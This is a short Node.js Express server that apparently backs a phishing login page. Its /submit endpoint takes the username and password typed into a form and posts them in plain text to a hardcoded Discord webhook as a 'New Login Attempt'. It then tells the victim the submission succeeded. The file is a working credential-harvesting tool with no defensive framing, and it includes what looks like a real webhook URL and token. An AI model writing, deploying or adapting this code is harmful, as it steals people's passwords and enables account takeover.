const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Discord Webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1332934403197894758/e3ewxM8k_060mWtHvbuC7-gidyuDW9J0Sug-55OMBWsiA-DC91tjCm5qToJCC5JwVVF_';

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname)); // Serve static files from the current directory

// Form submission endpoint
app.post('/submit', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('All fields are required.');
    }

    try {
        // Send data to Discord webhook
        await axios.post(DISCORD_WEBHOOK_URL, {
            content: `**New Login Attempt**\nUsername: ${username}\nPassword: ${password}`,
        });
        res.send('Form submitted successfully!');
    } catch (error) {
        console.error('Error sending to Discord:', error);
        res.status(500).send('An error occurred.');
    }
});

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
